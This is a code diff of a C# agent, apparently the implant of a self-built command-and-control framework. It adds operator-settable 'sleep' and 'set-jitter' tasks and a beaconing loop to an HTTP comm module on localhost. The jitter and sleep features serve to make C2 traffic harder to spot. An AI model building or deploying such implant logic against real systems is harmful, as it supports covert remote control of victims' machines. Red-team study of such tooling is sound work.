@@ -17,24 +17,29 @@ namespace Agent
         private static CommModule _commModule;
         private static CancellationTokenSource _tokenSource;
         private static List<AgentCommand> _commands = new List<AgentCommand>();
+        private static int _jitterSeconds;
+        private static int _ttsMins;
         static void Main(string[] args)
         {
-            Thread.Sleep(10000);
-
+            _jitterSeconds = 15;
+            _ttsMins = 1;
             GenerateMetadata();
             LoadAgentCommands();
             _commModule = new HttpCommModule("localhost", 8080);
             _commModule.Init(_metadata);
-            _commModule.Start();
-            _tokenSource = new CancellationTokenSource();
-            while (!_tokenSource.IsCancellationRequested)
+            while (true)
             {
-                if (_commModule.RecvData(out var tasks)) 
+                Start();
+                while (!_tokenSource.IsCancellationRequested)
                 {
-                    HandleTasks(tasks);
+                    if (_commModule.RecvData(out var tasks))
+                    {
+                        HandleTasks(tasks);
+                    }
                 }
+                Console.WriteLine("sleeping...");
+                Thread.Sleep(_ttsMins * 60000);
             }
-
         }
         private static void HandleTasks(IEnumerable<AgentTask> tasks)
         {
@@ -45,6 +50,23 @@ namespace Agent
         }
         private static void HandleTask(AgentTask task)
         {
+            if (task.Command == "sleep")
+            {
+                if (!HandleSleep(task))
+                {
+                    SendTaskResult(task.Id, "Failed to Sleep");
+                    return;
+                }
+                SendTaskResult(task.Id, $"Sleeping For {task.Args[0]} Minutes");
+                return;
+            }
+            if (task.Command == "set-jitter")
+            {
+                var result = HandleSetJitter(task);
+                SendTaskResult(task.Id, result);
+                Stop();
+                return;
+            }
             var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command,StringComparison.OrdinalIgnoreCase));
             if (command is null) {
                 SendTaskResult(task.Id, "Command not found");
@@ -58,10 +80,7 @@ namespace Agent
             {
                 SendTaskResult(task.Id, e.Message);
             }
-
-
         }
-
         private static void SendTaskResult(string taskId,string result)
         {
             var taskResult = new AgentTaskResult
@@ -71,10 +90,32 @@ namespace Agent
             };
             _commModule.SendData(taskResult);
         }
-
-        public void Stop()
+        private static bool HandleSleep(AgentTask task)
+        {
+            if (task.Args is null || task.Args.Length == 0) return false;
+            if (!int.TryParse(task.Args[0], out var mins)) return false;
+            Stop();
+            _ttsMins = mins; // <-- 
+            return true;
+        }
+        private static string HandleSetJitter(AgentTask task)
+        {
+            if (task.Args is null || task.Args.Length == 0) return "Failed to provide jitter in seconds";
+            if (!int.TryParse(task.Args[0], out var jitterSecs)) return "Failed to parse jitter in seconds";
+            _jitterSeconds = jitterSecs;
+            Stop();
+            _ttsMins = 1; // <-- 
+            return $"Successfully Set Jitter To {jitterSecs} Seconds";
+        }
+        public static void Start()
+        {
+            _commModule.Start(_jitterSeconds);
+            _tokenSource = new CancellationTokenSource();
+        }
+        public static void Stop()
         {
             _tokenSource.Cancel();
+            _commModule.Stop();
         }
         private static void LoadAgentCommands()
         {
